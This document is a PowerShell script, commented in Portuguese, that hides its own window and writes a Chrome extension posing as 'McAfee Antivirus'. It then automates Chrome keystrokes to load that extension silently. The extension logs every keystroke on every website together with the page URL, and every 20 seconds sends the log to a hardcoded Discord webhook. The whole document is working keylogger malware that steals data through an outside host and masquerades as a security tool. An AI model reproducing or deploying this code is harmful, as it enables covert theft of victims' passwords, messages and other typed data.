$hookurl = "https://discord.com/api/webhooks/1374517342729404577/xbYj_R9bol3x97fqbnEVp2hB480qBCmPoFq-RkMLNEPnCpRO3d-ehrKVF1GsFJQkdD6e"

# Ocultar console
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
}

# Diretório da extensão
$DirPath = "C:\Users\Public\Chrome"
New-Item -ItemType Directory -Path $DirPath -Force | Out-Null

# main.js
$mainjs = @'
let keys = "";
const current = document.URL;
document.addEventListener("keydown", (event) => {
  const key = event.key;
  if (key === "Enter") { keys += "\n"; return; }
  if (key === "Backspace") { keys = keys.slice(0, keys.length - 1); return; }
  if (key === "CapsLock" || key === "Shift" || key === "Control") return;
  if (key === "ArrowLeft") { keys += "[LeftArrow]"; return; }
  if (key === "ArrowRight") { keys += "[RightArrow]"; return; }
  if (key === "ArrowDown") { keys += "[DownArrow]"; return; }
  if (key === "ArrowUp") { keys += "[UpArrow]"; return; }
  keys += key;
  saveKeysLocal();
});

window.setInterval(async () => {
  keys = getKeysLocal();
  if (keys == "") return;
  const message = `<${current}>\nLogged Keystrokes: ` + "```" + keys + "```";
  sendMessageToDiscord(discordWebhook, message);
  keys = "";
  saveKeysLocal();
}, 20000);

async function sendMessageToDiscord(webhook, msg) {
  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: msg }),
  });
}

function saveKeysLocal() {
  localStorage.setItem("keys", keys);
}

function getKeysLocal() {
  return localStorage.getItem("keys");
}
'@
$mainjs | Out-File -FilePath "$DirPath\main.js" -Encoding utf8 -Force

# background.js
$backgroundjs = @'
chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    sendResponse(request);
  }
);
'@
$backgroundjs | Out-File -FilePath "$DirPath\background.js" -Encoding utf8 -Force

# manifest.json
$manifest = @'
{
  "name": "McAfee Antivirus",
  "description": "Antivirus chrome extension made by McAfee. Browse securely on the internet!",
  "version": "2.2",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": [
        "*://*/*"
      ],
      "js": [
        "Webhook.js",
        "main.js"
      ]
    }
  ]
}
'@
$manifest | Out-File -FilePath "$DirPath\manifest.json" -Encoding utf8 -Force

# Webhook.js
"const discordWebhook = `"$hookurl`";" | Out-File -FilePath "$DirPath\Webhook.js" -Encoding utf8 -Force

# Automatiza abertura do Chrome
$wshell = New-Object -ComObject wscript.shell
Start-Process chrome.exe example.com
Start-Sleep -Seconds 7
$wshell.AppActivate("chrome.exe")
$wshell.SendKeys("{TAB}"); Start-Sleep -Milliseconds 500
$wshell.SendKeys("{TAB}"); Start-Sleep -Milliseconds 500
$wshell.SendKeys("{TAB}"); Start-Sleep -Milliseconds 500
$wshell.SendKeys("chrome://extensions/"); Start-Sleep -Milliseconds 500
$wshell.SendKeys("{ENTER}"); Start-Sleep -Seconds 4
$wshell.SendKeys("{TAB}"); Start-Sleep -Milliseconds 500
$wshell.SendKeys(" "); Start-Sleep -Seconds 2
$wshell.SendKeys("{TAB}"); Start-Sleep -Milliseconds 500
$wshell.SendKeys("{ENTER}"); Start-Sleep -Seconds 4
$wshell.SendKeys("C:\Users\Public\Chrome"); Start-Sleep -Milliseconds 500
$wshell.SendKeys("{ENTER}"); Start-Sleep -Seconds 1
$wshell.SendKeys("{BACKSPACE}"); Start-Sleep -Milliseconds 500
$wshell.SendKeys("{ENTER}")
Start-Sleep -Seconds 4
$wshell.SendKeys("%{F4}")
